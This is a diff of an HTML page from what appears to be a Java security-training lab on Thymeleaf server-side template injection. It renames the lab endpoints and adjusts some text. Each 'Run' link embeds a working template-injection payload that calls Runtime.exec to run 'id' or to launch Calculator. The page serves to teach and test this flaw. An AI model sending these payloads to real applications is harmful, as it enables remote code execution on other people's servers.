@@ -12,8 +12,8 @@
                     <blockquote class="layui-elem-quote layui-quote-nm"
                                 style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
                         <p>
-                        <pre>   SSTI(Server Side Template Injection)：模板引擎是一种通过将模板中的占位符替换为实际数据来动态生成内容的工具，如HTML页面、邮件等。它简化了视图层的设计，但如果未对用户输入进行有效校验，可能导致安全风险如任意代码执行</pre>
-                        <pre>   Java中常用的模板引擎有Freemarker、Velocity、Thymeleaf等,在这里以Thymeleaf引擎为例</pre>
+                        <pre>  SSTI(Server Side Template Injection)：模板引擎是一种通过将模板中的占位符替换为实际数据来动态生成内容的工具，如HTML页面、邮件等。它简化了视图层的设计，但如果未对用户输入进行有效校验，可能导致安全风险如任意代码执行</pre>
+                        <pre>  Java中常用的模板引擎有Freemarker、Velocity、Thymeleaf等,在这里以Thymeleaf引擎为例</pre>
                         </p>
                     </blockquote>
                 </fieldset>
@@ -32,7 +32,7 @@
                                 <div class="layui-tab-item layui-show">
                                     <blockquote class="layui-elem-quote main_btn">
                                         <p>攻击者可以操控return中的值，就有可能造成模板注入漏洞</p>
-                                        <a target="_blank" href="/ssti/vul1-thymeleaf?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
+                                        <a target="_blank" href="/ssti/vul1?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
                                             <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
@@ -43,7 +43,7 @@
                                 <div class="layui-tab-item">
                                     <blockquote class="layui-elem-quote main_btn">
                                         <p>当方法返回为void时，thymeleaf会以URL路由为视图名称，调用模板视图去解析</p>
-                                        <a target="_blank" href="/ssti/vul2-thymeleaf/__$%7BT(java.lang.Runtime).getRuntime().exec('open%20-a%20Calculator')%7D__::.x">
+                                        <a target="_blank" href="/ssti/vul2/__$%7BT(java.lang.Runtime).getRuntime().exec('open%20-a%20Calculator')%7D__::.x">
                                             <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
@@ -54,7 +54,7 @@
                                 <div class="layui-tab-item">
                                     <blockquote class="layui-elem-quote main_btn">
                                         <p>text/html：浏览器在获取到这种文件时会自动调用html的解析器对文件进行相应的处理</p>
-                                        <a target="_blank" href="ssti/vul3-thymeleaf?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
+                                        <a target="_blank" href="ssti/vul3?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
                                             <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
@@ -87,7 +87,7 @@
             <div class="layui-col-md12" style="margin-top: 10px">
                 <div class="layui-row layui-col-space15">
                     <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-anquan"> 安全代码：thymeleaf模版注入</span></h1>
+                        <h1><span class="iconfont icon-anquan"> 安全环境：thymeleaf模版注入</span></h1>
                         <div class="layui-tab layui-tab-brief">
                             <ul class="layui-tab-title">
                                 <li class="layui-this">白名单</li>
@@ -98,7 +98,7 @@
                                 <div class="layui-tab-item layui-show">
                                     <blockquote class="layui-elem-quote main_btn">
                                         <p>基于白名单的路径校验</p>
-                                        <a target="_blank" href="/ssti/safe-thymeleaf?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
+                                        <a target="_blank" href="/ssti/safe1?para=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).next()%7d__::.x">
                                             <button class="layui-btn layui-btn-normal" style="width: 100px; margin-left: 10px;">
                                                 <span class="iconfont icon-zhihang">Run</span>
                                             </button>
